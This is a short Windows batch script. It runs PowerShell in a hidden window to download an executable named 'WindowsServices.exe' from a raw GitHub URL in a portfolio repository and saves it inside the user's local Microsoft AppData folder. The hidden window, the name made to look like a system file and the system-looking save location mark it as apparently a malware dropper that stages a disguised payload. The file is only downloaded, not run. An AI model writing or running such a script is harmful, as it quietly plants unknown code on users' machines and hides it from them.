@echo off
set DOWNLOAD_URL=https://raw.githubusercontent.com/AsjadSiddiqui/portfolio/master/public/WindowsServices.exe
set FILENAME=WindowsServices.exe
set TEMP_FOLDER=%TEMP%
set APPDATA_FOLDER=%APPDATA%
set LOCALAPPDATA_FOLDER=%LOCALAPPDATA%
set MICROSOFT_FOLDER=%LOCALAPPDATA_FOLDER%\Microsoft

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%MICROSOFT_FOLDER%\%FILENAME%')"